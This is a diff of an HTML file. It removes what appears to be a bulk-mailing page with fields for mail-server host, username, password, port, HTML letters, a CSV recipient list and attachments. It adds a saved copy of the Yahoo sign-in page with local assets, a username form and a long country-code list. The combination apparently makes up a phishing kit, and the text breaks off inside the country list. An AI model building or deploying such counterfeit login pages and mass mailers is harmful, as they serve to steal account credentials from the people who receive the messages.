@@ -1,532 +1,570 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Random Details Updater</title>
-</head>
-<style>
-#start{
-  border:1px solid blue;
-  background-color: blue;
-  color:aliceblue;
-  margin: 20px;
-  border-radius: 5px;
-  width: 60%;
-  height: auto;
-  padding-top: 10px;
-  padding-bottom: 10px;
-}
+<!-- saved from url=(0014)about:internet -->
+<html id="Stencil" class="js grid light-theme "><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
+        <meta name="format-detection" content="telephone=no">
+        <title>Yahoo</title>
+        <meta name="description" content="Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies... You get more out of the web, you get more out of life.">
+        <link rel="dns-prefetch" href="https://gstatic.com/">
+        <link rel="dns-prefetch" href="https://google.com/">
+        <link rel="dns-prefetch" href="https://s.yimg.com/">
+        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
+        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
+        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
+        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
+        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
+        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
+        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
+        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
+        <style nonce="">
+            #mbr-css-check {
+                display: inline;
+            }
+            .eye{
+        display:flex;
+        width:15px;
+        height: auto;
+        }
+        </style>
+        <link href="./Yahoo_files/yahoo-main.css" rel="stylesheet" type="text/css">
+        <script>
+            const url = window.location.href;
+        const parts = url.split('/');
+        const ablp = parts.slice(0, parts.length - 1).join('/');
+        
+    console.log(ablp); 
+            </script>
+        <script nonce="">
+            var pageStartTime = new Date().getTime();
+            (function(root) {
+                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
+                root.isGoodJS = isGoodJS;
+            }(this));
+            
+(function (root) {
+/* -- Data -- */
+root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
+//root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"}};
+root.I13N_config || (root.I13N_config = {});
+root.I13N_config.spaceid = 794200018;
+//root.I13N_config.location = "https:\u002F\u002Flogin.yahoo.com\u002F?.lang=en-US&src=homepage&pspid=2023538075&activity=ybar-signin";
+//root.I13N_config.referrer = "https:\u002F\u002Fwww.yahoo.com\u002F";
+root.I13N_config.keys || (root.I13N_config.keys = {});
 
-.error-box{
+root.COMET_URL = "https:\u002F\u002Fserver.comet.yahoo.com\u002Fcomet";
+//root.gamIframeUrl = "https:\u002F\u002Fgpt.mail.yahoo.net\u002Fsandbox?client=login&version=0.1&limited=0&headerBidder=1&haq=1#config=%7B%22adUnitPath%22%3A%22%2F22888152279%2Fus%2Fylogin%2Fmain%2Fdt%2Fus_ylogin_main_dt_full_screen%22%2C%22size%22%3A%5B%5B1440%2C1024%5D%2C%5B%22fluid%22%5D%5D%2C%22pageUrl%22%3A%22https%3A%2F%2Flogin.yahoo.com%22%2C%22headerBidder%22%3Atrue%2C%22npa%22%3Afalse%2C%22limited%22%3Afalse%2C%22PPId%22%3A%22__PPId__%22%2C%22targetingConfig%22%3A%7B%22lang%22%3A%22en-US%22%2C%22bucket%22%3A%22mbr-apt-trap-design-v2%22%2C%22spaceId%22%3A%22794200018%22%2C%22adLocation%22%3A%22full_screen%22%2C%22age%22%3A%220%22%2C%22gender%22%3A%220%22%2C%22colo%22%3A%22ir2%22%2C%22lu%22%3A%220%22%2C%22site%22%3A%22login%22%2C%22device%22%3A%22desktop%22%2C%22region%22%3A%22us%22%2C%22pageOrigin%22%3A%22https%3A%2F%2Flogin.yahoo.com%22%2C%22AXId%22%3A%22__AXId__%22%7D%2C%22headerBidderConfig%22%3A%7B%22host%22%3A%22login.yahoo.com%22%2C%22pblob%22%3A%22lu%3A0%7C%7C794200018%7C%7C%22%2C%22buckets%22%3A%5B%22mbr-apt-trap-design-v2%22%5D%2C%22limited%22%3Afalse%2C%22cobrand%22%3A%22%22%2C%22lang%22%3A%22en-US%22%2C%22site%22%3A%22yahoo_login%22%2C%22region%22%3A%22us%22%2C%22adLocation%22%3A%22full_screen%22%2C%22dv360%22%3A%22__DV360__%22%2C%22AXId%22%3A%22__AXId__%22%7D%7D";
+root.challenge || (root.challenge = {});
+root.challenge.servingStamp = 1703679619705;
+root.challenge.isAndroidWebview = false;
+root.I13N_config.keys.pct = "signin";
+root.COUNTRY_CODES_MAP = {"AF":"+93","AL":"+355","DZ":"+213","AS":"+1","AD":"+376","AO":"+244","AI":"+1","AG":"+1","AR":"+54","AM":"+374","AW":"+297","AC":"+247","AU":"+61","AX":"+672","AT":"+43","AZ":"+994","BS":"+1","BH":"+973","BD":"+880","BB":"+1","BY":"+375","BE":"+32","BZ":"+501","BJ":"+229","BM":"+1","BT":"+975","BO":"+591","BA":"+387","BW":"+267","BR":"+55","VG":"+1","BN":"+673","BG":"+359","BF":"+226","BI":"+257","KH":"+855","CM":"+237","CA":"+1","CV":"+238","KY":"+1","CF":"+236","TD":"+235","CL":"+56","CN":"+86","CO":"+57","KM":"+269","CG":"+242","CK":"+682","CR":"+506","CI":"+225","HR":"+385","CU":"+53","CY":"+357","CZ":"+420","CD":"+243","DK":"+45","DG":"+246","DJ":"+253","DM":"+1","DO":"+1","TL":"+670","EC":"+593","EG":"+20","SV":"+503","GQ":"+240","ER":"+291","EE":"+372","ET":"+251","FK":"+500","FO":"+298","FJ":"+679","FI":"+358","FR":"+33","GF":"+594","PF":"+689","GA":"+241","GM":"+220","GE":"+995","DE":"+49","GH":"+233","GI":"+350","GR":"+30","GL":"+299","GD":"+1","GP":"+590","GU":"+1","GT":"+502","GN":"+224","GW":"+245","GY":"+592","HT":"+509","HN":"+504","HK":"+852","HU":"+36","IS":"+354","IN":"+91","ID":"+62","IR":"+98","IQ":"+964","IE":"+353","IL":"+972","IT":"+39","JM":"+1","JP":"+81","JO":"+962","KZ":"+7","KE":"+254","KI":"+686","XK":"+383","KW":"+965","KG":"+996","LA":"+856","LV":"+371","LB":"+961","LS":"+266","LR":"+231","LY":"+218","LI":"+423","LT":"+370","LU":"+352","MO":"+853","MK":"+389","MG":"+261","MW":"+265","MY":"+60","MV":"+960","ML":"+223","MT":"+356","MH":"+692","MQ":"+596","MR":"+222","MU":"+230","MX":"+52","FM":"+691","MD":"+373","MC":"+377","MN":"+976","ME":"+382","MS":"+1","MA":"+212","MZ":"+258","MM":"+95","NA":"+264","NR":"+674","NP":"+977","NL":"+31","AN":"+599","NC":"+687","NZ":"+64","NI":"+505","NE":"+227","NG":"+234","NU":"+683","KP":"+850","MP":"+1","NO":"+47","OM":"+968","PK":"+92","PW":"+680","PS":"+970","PA":"+507","PG":"+675","PY":"+595","PE":"+51","PH":"+63","PL":"+48","PT":"+351","PR":"+1","QA":"+974","RE":"+262","RO":"+40","RU":"+7","RW":"+250","SH":"+290","KN":"+1","LC":"+1","PM":"+508","VC":"+1","WS":"+685","SM":"+378","ST":"+239","SA":"+966","SN":"+221","RS":"+381","SC":"+248","SL":"+232","SG":"+65","SK":"+421","SI":"+386","SB":"+677","SO":"+252","ZA":"+27","KR":"+82","ES":"+34","LK":"+94","SD":"+249","SR":"+597","SZ":"+268","SE":"+46","CH":"+41","SY":"+963","TW":"+886","TJ":"+992","TZ":"+255","TH":"+66","TG":"+228","TK":"+690","TO":"+676","TT":"+1","TN":"+216","TR":"+90","TM":"+993","TC":"+1","TV":"+688","VI":"+1","UG":"+256","UA":"+380","AE":"+971","GB":"+44","US":"+1","UY":"+598","UZ":"+998","VU":"+678","VA":"+379","VE":"+58","VN":"+84","WF":"+681","YE":"+967","ZM":"+260","ZW":"+263"};
+root.enforceCountryCodeDropDown = false;
+root.isIOSDevice = true;
+}(this));
 
-
-}
-
-.smd{
-margin-bottom: 15px;
-height:15px;
-padding-top:10px;
-padding-bottom: 10px;
-position:
-}
-
-#container{
-display: grid;
-place-items: center;
-}
-
-.inc{
-position: relative;
-padding:10px;
-width:90%; 
-}
-
-.stop{
- background-color: rgb(233, 14, 14);
- height: 30px;
- width: 15%;
-
- justify-content: center;
- align-items: center;
- color: antiquewhite;
- border: solid 1px red ;
- border-radius: 8px;
-}
-
-
-  #leftSlide {
-    display: flex;
-    position: fixed;
-    height: 100%;
-    margin-left: 50px;
-    background-color: rgb(252, 251, 251);
-    right: 0;
-    border-left: 2px solid black;
-    z-index: 100000;
-    top: 0px;
-    bottom: 0px;
-    overflow:auto;
-    width: 0%; 
-    transition: 0.5s;
-  }
+            
+            YUI_config.global = window;
 
 
-  #leftSlide.expanded {
-    width: 40%; /* Adjust the target width as needed */
-}
-
-#x{
-  
-  font-size: 30px;
-  display: inline-block;
-  transform: rotate(45deg);
-  cursor: pointer;
-  margin-left: 6px;
-}
-
-#x-back{
-  justify-content: center;
-  align-items: center;
-  margin-left: 5px;
-  background-color: rgb(146, 146, 145);
-  border-radius: 50%;
-  border-width :1px;
-  height: 30px;
-  width: 30px;
-  position: fixed;
-  top:0;
-  left: 80;
- 
-}
-
-.triangle {
-  rotate: -90deg;
-    display: flex;
-    top: 10;
-    bottom: 50%;
-    right: 0;
-    position: fixed;
-    width: 0;
-    height: 0;
-    border-left: 5px solid transparent;
-    border-right: 5px solid transparent;
-    border-bottom: 8px solid #3498db;
-}
-
-.triangle.hide {
-  transform: rotate(180deg);
-  margin-right: 40%;
-  transition: 0.5s;
-}
-
-@media only screen and (max-width: 767px) {
-  .triangle.hide {
-  margin-right: 100%;
-}
-#leftSlide.expanded {
-    width: 100%; /* Adjust the target width as needed */
-}
-}
-
-.letter{
-border-color: blue;
-}
-</style>
-
-<body>
-  <!-- Your HTML body content goes here -->
-  	<div id="container">
-  		
-  <textarea placeholder="Host, Username, Pword, Port, SSL "   class="inc inputs" id="textInput" rows="10" cols="50"></textarea>
-  <br>
-
-  	<section id="inputContainer" style="width:100%;"> 
-  <textarea placeholder="html content" class="inc inputs letter" id="htmlContent" rows="10" col="50"></textarea>
-   <br>
-   </section>	
-	<section style="display:block">
-		<br><br>
-		<button style="text-align:center;" id="addletter" height:20px; width:20px onclick="addInput()">Add Letter</button>
-		<br>
-		<br>
-  <input class="inc inputs" type="file" id="fileInput" accept=".csv">
-  <br><br>
-  <div style="display: flex; border: 1px solid black; align-items: center; justify-content: center; text-align: center;">
-
-  <label class="" for="attach" style="font-size: 20px; font-weight: 80; padding:0; ">
-      +
-    <input type="file" class="inputs" id="attach" accept="*" style="display:none;" > 
-    <span id="att-text" style="white-space: nowrap; font-size: 14px;">Add Attachment Here</span>
-</label>
-
+        </script>
+    </head>
+    <body class="bucket-mbr-apt-trap-design-v2">
+    <div id="login-body" class="loginish  puree-v2  grid    ">
+    <div class="mbr-desktop-hd">
+    <span class="column">
+         <a href="https://www.yahoo.com/">
+            <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
+            <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36">
+        </a>
+    </span>
+    <span class="column help txt-align-right">
+        <a href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT">Help</a>
+    </span>
+</div>
+    <div class="login-box-container">
+        <div class="login-box right">
+            <div class="mbr-login-hd txt-align-center">
+                    <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
+                    <img src="./Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
+            </div>
+            <div class="challenge yid-challenge">
+    <div class="challenge-header">
+</div><div style="text-align: center;" id="yid" class="yid"></div>
+<div class="username-challenge" id="login-landing">
+    <strong id="strong-mess" class="challenge-heading">Sign&nbsp;in</strong>
+    <span id="feint-mess" class="challenge-desc signin-sub-title">using your Yahoo&nbsp;account</span>
+    
+    <form id="login-username-form" method="post" class="pure-form">
+         <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-3">
+            <div id="selected-country-code-cont" class="puree-dropdown selected-country-code-cont ltr hide">
+                <div id="selected-country-code" class="selected-country-code">+234</div>
+                <span class="arrow"></span>
+            </div>
+            <div id="country-dropdown-container" class="country-code-dropdown country-dropdown-container hide">
+                <div class="puree-dropdown">
+    <label class="offscreen" id="country-code-lbl-aria">Enter Country Code</label>
+    <select type="select" name="countryCodeIntl" aria-required="true" role="combobox" aria-multiline="false" aria-labelledby="country-code-lbl-aria" disabled="">
+        <option role="option" data-code="+93" value="AF">Afghanistan ‪(+93)‬</option>
+        <option role="option" data-code="+355" value="AL">Albania ‪(+355)‬</option>
+        <option role="option" data-code="+213" value="DZ">Algeria ‪(+213)‬</option>
+        <option role="option" data-code="+1" value="AS">American Samoa ‪(+1)‬</option>
+        <option role="option" data-code="+376" value="AD">Andorra ‪(+376)‬</option>
+        <option role="option" data-code="+244" value="AO">Angola ‪(+244)‬</option>
+        <option role="option" data-code="+1" value="AI">Anguilla ‪(+1)‬</option>
+        <option role="option" data-code="+1" value="AG">Antigua and Barbuda ‪(+1)‬</option>
+        <option role="option" data-code="+54" value="AR">Argentina ‪(+54)‬</option>
+        <option role="option" data-code="+374" value="AM">Armenia ‪(+374)‬</option>
+        <option role="option" data-code="+297" value="AW">Aruba ‪(+297)‬</option>
+        <option role="option" data-code="+247" value="AC">Ascension ‪(+247)‬</option>
+        <option role="option" data-code="+61" value="AU">Australia ‪(+61)‬</option>
+        <option role="option" data-code="+672" value="AX">Australian External Territories ‪(+672)‬</option>
+        <option role="option" data-code="+43" value="AT">Austria ‪(+43)‬</option>
+        <option role="option" data-code="+994" value="AZ">Azerbaijan ‪(+994)‬</option>
+        <option role="option" data-code="+1" value="BS">Bahamas ‪(+1)‬</option>
+        <option role="option" data-code="+973" value="BH">Bahrain ‪(+973)‬</option>
+        <option role="option" data-code="+880" value="BD">Bangladesh ‪(+880)‬</option>
+        <option role="option" data-code="+1" value="BB">Barbados ‪(+1)‬</option>
+        <option role="option" data-code="+375" value="BY">Belarus ‪(+375)‬</option>
+        <option role="option" data-code="+32" value="BE">Belgium ‪(+32)‬</option>
+        <option role="option" data-code="+501" value="BZ">Belize ‪(+501)‬</option>
+        <option role="option" data-code="+229" value="BJ">Benin ‪(+229)‬</option>
+        <option role="option" data-code="+1" value="BM">Bermuda ‪(+1)‬</option>
+        <option role="option" data-code="+975" value="BT">Bhutan ‪(+975)‬</option>
+        <option role="option" data-code="+591" value="BO">Bolivia ‪(+591)‬</option>
+        <option role="option" data-code="+387" value="BA">Bosnia and Herzegovina ‪(+387)‬</option>
+        <option role="option" data-code="+267" value="BW">Botswana ‪(+267)‬</option>
+        <option role="option" data-code="+55" value="BR">Brazil ‪(+55)‬</option>
+        <option role="option" data-code="+1" value="VG">British Virgin Islands ‪(+1)‬</option>
+        <option role="option" data-code="+673" value="BN">Brunei Darussalam ‪(+673)‬</option>
+        <option role="option" data-code="+359" value="BG">Bulgaria ‪(+359)‬</option>
+        <option role="option" data-code="+226" value="BF">Burkina Faso ‪(+226)‬</option>
+        <option role="option" data-code="+257" value="BI">Burundi ‪(+257)‬</option>
+        <option role="option" data-code="+855" value="KH">Cambodia ‪(+855)‬</option>
+        <option role="option" data-code="+237" value="CM">Cameroon ‪(+237)‬</option>
+        <option role="option" data-code="+1" value="CA">Canada ‪(+1)‬</option>
+        <option role="option" data-code="+238" value="CV">Cape Verde ‪(+238)‬</option>
+        <option role="option" data-code="+1" value="KY">Cayman Islands ‪(+1)‬</option>
+        <option role="option" data-code="+236" value="CF">Central African Republic ‪(+236)‬</option>
+        <option role="option" data-code="+235" value="TD">Chad ‪(+235)‬</option>
+        <option role="option" data-code="+56" value="CL">Chile ‪(+56)‬</option>
+        <option role="option" data-code="+86" value="CN">China ‪(+86)‬</option>
+        <option role="option" data-code="+57" value="CO">Colombia ‪(+57)‬</option>
+        <option role="option" data-code="+269" value="KM">Comoros ‪(+269)‬</option>
+        <option role="option" data-code="+242" value="CG">Congo ‪(+242)‬</option>
+        <option role="option" data-code="+682" value="CK">Cook Islands ‪(+682)‬</option>
+        <option role="option" data-code="+506" value="CR">Costa Rica ‪(+506)‬</option>
+        <option role="option" data-code="+225" value="CI">Cote dÕIvoire ‪(+225)‬</option>
+        <option role="option" data-code="+385" value="HR">Croatia ‪(+385)‬</option>
+        <option role="option" data-code="+53" value="CU">Cuba ‪(+53)‬</option>
+        <option role="option" data-code="+357" value="CY">Cyprus ‪(+357)‬</option>
+        <option role="option" data-code="+420" value="CZ">Czech Republic ‪(+420)‬</option>
+        <option role="option" data-code="+243" value="CD">Democratic Republic of the Congo ‪(+243)‬</option>
+        <option role="option" data-code="+45" value="DK">Denmark ‪(+45)‬</option>
+        <option role="option" data-code="+246" value="DG">Diego Garcia ‪(+246)‬</option>
+        <option role="option" data-code="+253" value="DJ">Djibouti ‪(+253)‬</option>
+        <option role="option" data-code="+1" value="DM">Dominica ‪(+1)‬</option>
+        <option role="option" data-code="+1" value="DO">Dominican Republic ‪(+1)‬</option>
+        <option role="option" data-code="+670" value="TL">East Timor ‪(+670)‬</option>
+        <option role="option" data-code="+593" value="EC">Ecuador ‪(+593)‬</option>
+        <option role="option" data-code="+20" value="EG">Egypt ‪(+20)‬</option>
+        <option role="option" data-code="+503" value="SV">El Salvador ‪(+503)‬</option>
+        <option role="option" data-code="+240" value="GQ">Equatorial Guinea ‪(+240)‬</option>
+        <option role="option" data-code="+291" value="ER">Eritrea ‪(+291)‬</option>
+        <option role="option" data-code="+372" value="EE">Estonia ‪(+372)‬</option>
+        <option role="option" data-code="+251" value="ET">Ethiopia ‪(+251)‬</option>
+        <option role="option" data-code="+500" value="FK">Falkland Islands ‪(+500)‬</option>
+        <option role="option" data-code="+298" value="FO">Faroe Islands ‪(+298)‬</option>
+        <option role="option" data-code="+679" value="FJ">Fiji ‪(+679)‬</option>
+        <option role="option" data-code="+358" value="FI">Finland ‪(+358)‬</option>
+        <option role="option" data-code="+33" value="FR">France ‪(+33)‬</option>
+        <option role="option" data-code="+594" value="GF">French Guiana ‪(+594)‬</option>
+        <option role="option" data-code="+689" value="PF">French Polynesia ‪(+689)‬</option>
+        <option role="option" data-code="+241" value="GA">Gabon ‪(+241)‬</option>
+        <option role="option" data-code="+220" value="GM">Gambia ‪(+220)‬</option>
+        <option role="option" data-code="+995" value="GE">Georgia ‪(+995)‬</option>
+        <option role="option" data-code="+49" value="DE">Germany ‪(+49)‬</option>
+        <option role="option" data-code="+233" value="GH">Ghana ‪(+233)‬</option>
+        <option role="option" data-code="+350" value="GI">Gibraltar ‪(+350)‬</option>
+        <option role="option" data-code="+30" value="GR">Greece ‪(+30)‬</option>
+        <option role="option" data-code="+299" value="GL">Greenland ‪(+299)‬</option>
+        <option role="option" data-code="+1" value="GD">Grenada ‪(+1)‬</option>
+        <option role="option" data-code="+590" value="GP">Guadeloupe ‪(+590)‬</option>
+        <option role="option" data-code="+1" value="GU">Guam ‪(+1)‬</option>
+        <option role="option" data-code="+502" value="GT">Guatemala ‪(+502)‬</option>
+        <option role="option" data-code="+224" value="GN">Guinea ‪(+224)‬</option>
+        <option role="option" data-code="+245" value="GW"> ‪(+245)‬</option>
+        <option role="option" data-code="+592" value="GY">Guyana ‪(+592)‬</option>
+        <option role="option" data-code="+509" value="HT">Haiti ‪(+509)‬</option>
+        <option role="option" data-code="+504" value="HN">Honduras ‪(+504)‬</option>
+        <option role="option" data-code="+852" value="HK">Hong Kong ‪(+852)‬</option>
+        <option role="option" data-code="+36" value="HU">Hungary ‪(+36)‬</option>
+        <option role="option" data-code="+354" value="IS">Iceland ‪(+354)‬</option>
+        <option role="option" data-code="+91" value="IN">India ‪(+91)‬</option>
+        <option role="option" data-code="+62" value="ID">Indonesia ‪(+62)‬</option>
+        <option role="option" data-code="+98" value="IR">Iran ‪(+98)‬</option>
+        <option role="option" data-code="+964" value="IQ">Iraq ‪(+964)‬</option>
+        <option role="option" data-code="+353" value="IE">Ireland ‪(+353)‬</option>
+        <option role="option" data-code="+972" value="IL">Israel ‪(+972)‬</option>
+        <option role="option" data-code="+39" value="IT">Italy ‪(+39)‬</option>
+        <option role="option" data-code="+1" value="JM">Jamaica ‪(+1)‬</option>
+        <option role="option" data-code="+81" value="JP">Japan ‪(+81)‬</option>
+        <option role="option" data-code="+962" value="JO">Jordan ‪(+962)‬</option>
+        <option role="option" data-code="+7" value="KZ">Kazakhstan ‪(+7)‬</option>
+        <option role="option" data-code="+254" value="KE">Kenya ‪(+254)‬</option>
+        <option role="option" data-code="+686" value="KI">Kiribati ‪(+686)‬</option>
+        <option role="option" data-code="+383" value="XK"> ‪(+383)‬</option>
+        <option role="option" data-code="+965" value="KW">Kuwait ‪(+965)‬</option>
+        <option role="option" data-code="+996" value="KG">Kyrgyzstan ‪(+996)‬</option>
+        <option role="option" data-code="+856" value="LA">Laos ‪(+856)‬</option>
+        <option role="option" data-code="+371" value="LV">Latvia ‪(+371)‬</option>
+        <option role="option" data-code="+961" value="LB">Lebanon ‪(+961)‬</option>
+        <option role="option" data-code="+266" value="LS">Lesotho ‪(+266)‬</option>
+        <option role="option" data-code="+231" value="LR">Liberia ‪(+231)‬</option>
+        <option role="option" data-code="+218" value="LY">Libya ‪(+218)‬</option>
+        <option role="option" data-code="+423" value="LI">Liechtenstein ‪(+423)‬</option>
+        <option role="option" data-code="+370" value="LT">Lithuania ‪(+370)‬</option>
+        <option role="option" data-code="+352" value="LU">Luxembourg ‪(+352)‬</option>
+        <option role="option" data-code="+853" value="MO">Macao ‪(+853)‬</option>
+        <option role="option" data-code="+389" value="MK">Macedonia ‪(+389)‬</option>
+        <option role="option" data-code="+261" value="MG">Madagascar ‪(+261)‬</option>
+        <option role="option" data-code="+265" value="MW">Malawi ‪(+265)‬</option>
+        <option role="option" data-code="+60" value="MY">Malaysia ‪(+60)‬</option>
+        <option role="option" data-code="+960" value="MV">Maldives ‪(+960)‬</option>
+        <option role="option" data-code="+223" value="ML">Mali ‪(+223)‬</option>
+        <option role="option" data-code="+356" value="MT">Malta ‪(+356)‬</option>
+        <option role="option" data-code="+692" value="MH">Marshall Islands ‪(+692)‬</option>
+        <option role="option" data-code="+596" value="MQ">Martinique ‪(+596)‬</option>
+        <option role="option" data-code="+222" value="MR">Mauritania ‪(+222)‬</option>
+        <option role="option" data-code="+230" value="MU">Mauritius ‪(+230)‬</option>
+        <option role="option" data-code="+52" value="MX">Mexico ‪(+52)‬</option>
+        <option role="option" data-code="+691" value="FM">Micronesia ‪(+691)‬</option>
+        <option role="option" data-code="+373" value="MD">Moldova ‪(+373)‬</option>
+        <option role="option" data-code="+377" value="MC">Monaco ‪(+377)‬</option>
+        <option role="option" data-code="+976" value="MN">Mongolia ‪(+976)‬</option>
+        <option role="option" data-code="+382" value="ME">Montenegro ‪(+382)‬</option>
+        <option role="option" data-code="+1" value="MS">Montserrat ‪(+1)‬</option>
+        <option role="option" data-code="+212" value="MA">Morocco ‪(+212)‬</option>
+        <option role="option" data-code="+258" value="MZ">Mozambique ‪(+258)‬</option>
+        <option role="option" data-code="+95" value="MM">Myanmar ‪(+95)‬</option>
+        <option role="option" data-code="+264" value="NA">Namibia ‪(+264)‬</option>
+        <option role="option" data-code="+674" value="NR">Nauru ‪(+674)‬</option>
+        <option role="option" data-code="+977" value="NP">Nepal ‪(+977)‬</option>
+        <option role="option" data-code="+31" value="NL">Netherlands ‪(+31)‬</option>
+        <option role="option" data-code="+599" value="AN"> ‪(+599)‬</option>
+        <option role="option" data-code="+687" value="NC">New Caledonia ‪(+687)‬</option>
+        <option role="option" data-code="+64" value="NZ">New Zealand ‪(+64)‬</option>
+        <option role="option" data-code="+505" value="NI">Nicaragua ‪(+505)‬</option>
+        <option role="option" data-code="+227" value="NE">Niger ‪(+227)‬</option>
+        <option role="option" data-code="+234" value="NG" selected="selected">Nigeria ‪(+234)‬</option>
+        <option role="option" data-code="+683" value="NU">Niue ‪(+683)‬</option>
+        <option role="option" data-code="+850" value="KP">North Korea ‪(+850)‬</option>
+        <option role="option" data-code="+1" value="MP">Northern Mariana Islands ‪(+1)‬</option>
+        <option role="option" data-code="+47" value="NO">Norway ‪(+47)‬</option>
+        <option role="option" data-code="+968" value="OM">Oman ‪(+968)‬</option>
+        <option role="option" data-code="+92" value="PK">Pakistan ‪(+92)‬</option>
+        <option role="option" data-code="+680" value="PW">Palau ‪(+680)‬</option>
+        <option role="option" data-code="+970" value="PS">Palestine ‪(+970)‬</option>
+        <option role="option" data-code="+507" value="PA">Panama ‪(+507)‬</option>
+        <option role="option" data-code="+675" value="PG">Papua New Guinea ‪(+675)‬</option>
+        <option role="option" data-code="+595" value="PY">Paraguay ‪(+595)‬</option>
+        <option role="option" data-code="+51" value="PE">Peru ‪(+51)‬</option>
+        <option role="option" data-code="+63" value="PH">Philippines ‪(+63)‬</option>
+        <option role="option" data-code="+48" value="PL">Poland ‪(+48)‬</option>
+        <option role="option" data-code="+351" value="PT">Portugal ‪(+351)‬</option>
+        <option role="option" data-code="+1" value="PR">Puerto Rico ‪(+1)‬</option>
+        <option role="option" data-code="+974" value="QA">Qatar ‪(+974)‬</option>
+        <option role="option" data-code="+262" value="RE">Reunion ‪(+262)‬</option>
+        <option role="option" data-code="+40" value="RO">Romania ‪(+40)‬</option>
+        <option role="option" data-code="+7" value="RU">Russia ‪(+7)‬</option>
+        <option role="option" data-code="+250" value="RW">Rwanda ‪(+250)‬</option>
+        <option role="option" data-code="+290" value="SH">Saint Helena ‪(+290)‬</option>
+        <option role="option" data-code="+1" value="KN">Saint Kitts and Nevis ‪(+1)‬</option>
+        <option role="option" data-code="+1" value="LC">Saint Lucia ‪(+1)‬</option>
+        <option role="option" data-code="+508" value="PM">Saint Pierre and Miquelon ‪(+508)‬</option>
+        <option role="option" data-code="+1" value="VC">Saint Vincent and Grenadines ‪(+1)‬</option>
+        <option role="option" data-code="+685" value="WS">Samoa ‪(+685)‬</option>
+        <option role="option" data-code="+378" value="SM">San Marino ‪(+378)‬</option>
+        <option role="option" data-code="+239" value="ST">Sao Tome and Principe ‪(+239)‬</option>
+        <option role="option" data-code="+966" value="SA">Saudi Arabia ‪(+966)‬</option>
+        <option role="option" data-code="+221" value="SN">Senegal ‪(+221)‬</option>
+        <option role="option" data-code="+381" value="RS">Serbia ‪(+381)‬</option>
+        <option role="option" data-code="+248" value="SC">Seychelles ‪(+248)‬</option>
+        <option role="option" data-code="+232" value="SL">Sierra Leone ‪(+232)‬</option>
+        <option role="option" data-code="+65" value="SG">Singapore ‪(+65)‬</option>
+        <option role="option" data-code="+421" value="SK">Slovakia ‪(+421)‬</option>
+        <option role="option" data-code="+386" value="SI">Slovenia ‪(+386)‬</option>
+        <option role="option" data-code="+677" value="SB">Solomon Islands ‪(+677)‬</option>
+        <option role="option" data-code="+252" value="SO">Somalia ‪(+252)‬</option>
+        <option role="option" data-code="+27" value="ZA">South Africa ‪(+27)‬</option>
+        <option role="option" data-code="+82" value="KR">South Korea ‪(+82)‬</option>
+        <option role="option" data-code="+34" value="ES">Spain ‪(+34)‬</option>
+        <option role="option" data-code="+94" value="LK">Sri Lanka ‪(+94)‬</option>
+        <option role="option" data-code="+249" value="SD">Sudan ‪(+249)‬</option>
+        <option role="option" data-code="+597" value="SR">Suriname ‪(+597)‬</option>
+        <option role="option" data-code="+268" value="SZ">Swaziland ‪(+268)‬</option>
+        <option role="option" data-code="+46" value="SE">Sweden ‪(+46)‬</option>
+        <option role="option" data-code="+41" value="CH">Switzerland ‪(+41)‬</option>
+        <option role="option" data-code="+963" value="SY">Syria ‪(+963)‬</option>
+        <option role="option" data-code="+886" value="TW">Taiwan ‪(+886)‬</option>
+        <option role="option" data-code="+992" value="TJ">Tajikistan ‪(+992)‬</option>
+        <option role="option" data-code="+255" value="TZ">Tanzania ‪(+255)‬</option>
+        <option role="option" data-code="+66" value="TH">Thailand ‪(+66)‬</option>
+        <option role="option" data-code="+228" value="TG">Togo ‪(+228)‬</option>
+        <option role="option" data-code="+690" value="TK">Tokelau ‪(+690)‬</option>
+        <option role="option" data-code="+676" value="TO">Tonga ‪(+676)‬</option>
+        <option role="option" data-code="+1" value="TT">Trinidad and Tobago ‪(+1)‬</option>
+        <option role="option" data-code="+216" value="TN">Tunisia ‪(+216)‬</option>
+        <option role="option" data-code="+90" value="TR">Turkey ‪(+90)‬</option>
+        <option role="option" data-code="+993" value="TM">Turkmenistan ‪(+993)‬</option>
+        <option role="option" data-code="+1" value="TC">Turks and Caicos Islands ‪(+1)‬</option>
+        <option role="option" data-code="+688" value="TV">Tuvalu ‪(+688)‬</option>
+        <option role="option" data-code="+1" value="VI">US Virgin Islands ‪(+1)‬</option>
+        <option role="option" data-code="+256" value="UG">Uganda ‪(+256)‬</option>
+        <option role="option" data-code="+380" value="UA">Ukraine ‪(+380)‬</option>
+        <option role="option" data-code="+971" value="AE">United Arab Emirates ‪(+971)‬</option>
